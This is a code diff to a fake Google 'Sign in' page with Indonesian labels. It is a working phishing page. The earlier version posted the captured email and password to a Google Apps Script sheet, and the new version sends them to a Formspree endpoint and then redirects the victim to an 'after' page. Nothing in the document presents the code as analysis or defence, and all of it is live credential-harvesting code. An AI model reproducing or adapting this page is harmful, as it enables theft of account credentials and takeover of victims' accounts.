@@ -12,16 +12,16 @@
 </head>
 <body>
         <div class="box" >
-          <div class="img" align="center"><img src="../img/google-1.png" alt=""></div>
+          <div class="img" align="center"><img src="../img/google-1.png" alt="" ></div>
                 <h2>Sign in</h2>
                 <p>Use your Google Account</p>
-                <form name="submit-to-google-sheet">
+                <form  id="contact-form" action="https://formspree.io/f/xbjelaaw" method="POST">
                   <div class="inputBox">
-                    <input type="email" required onkeyup="this.setAttribute('value', this.value);"  value="" name="email">
+                    <input type="email" required  value="" name="email">
                     <label>Email atau Ponsel</label>
                   </div>
                   <div class="inputBox">
-                        <input type="password" required onkeyup="this.setAttribute('value', this.value);" value="" name="id">
+                        <input type="password" required value="" name="id">
                         <label>Password</label>
                  </div>
 
@@ -40,17 +40,24 @@
                       <input type="submit" name="sign-in" value="Sign In">
                 </form>
               </div>
+             <script>
+               const contactForm = document.getElementById("contact-form");
 
-              <script>
-                const scriptURL = '<https://script.google.com/macros/s/AKfycbyYDp0QvcvTUq8kemYP_zBqJulBZCIGsJ2fucBsufhO1w_m_QQ3impCGjaz3v0d5Q9_/exec>'
-                const form = document.forms['submit-to-google-sheet']
-              
-                form.addEventListener('submit', e => {
-                  e.preventDefault()
-                  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                    .then(response => console.log('Success!', response))
-                    .catch(error => console.error('Error!', error.message))
-                })
+contactForm.addEventListener("submit", function (e) {
+  e.preventDefault();
+  const url = e.target.action;
+  const formData = new FormData(contactForm);
+
+  fetch(url, {
+    method: "POST",
+    body: formData,
+    mode: "no-cors",
+  })
+    .then(() => {
+      window.location.href = "./after.html";
+    })
+    .catch((e) => alert("Error occured"));
+});
               </script>
 </body>
 </html>
